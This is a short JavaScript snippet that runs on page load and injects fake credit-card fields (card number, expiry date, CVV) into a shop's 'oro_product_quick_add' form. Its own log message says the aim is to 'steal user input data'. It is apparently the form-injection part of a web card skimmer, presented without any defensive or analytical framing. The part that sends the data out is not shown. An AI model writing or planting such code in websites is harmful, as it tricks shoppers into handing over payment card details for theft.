function displayInput() {
    // render input fields to enter credit card data
    
    const inputContainer = document.createElement('div');
    inputContainer.id = 'creditCardInput';
    inputContainer.style.display = 'block';

    inputContainer.innerHTML = `
        <label for="cardNumber">Card Number:</label>
        <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" required>
        
        <label for="expiryDate">Expiry Date:</label>
        <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" required>
        
        <label for="cvv">CVV:</label>
        <input type="text" id="cvv" name="cvv" placeholder="123" required>
        
        <button type="submit">Submit</button>
    `;

    // add it to form with name oro_product_quick_add
    const form = document.querySelector('form[name="oro_product_quick_add"]');
    if (form) {
        form.appendChild(inputContainer);
    } else {
        console.log('can not add the form the steal user input data');
    }
}

window.onload = displayInput;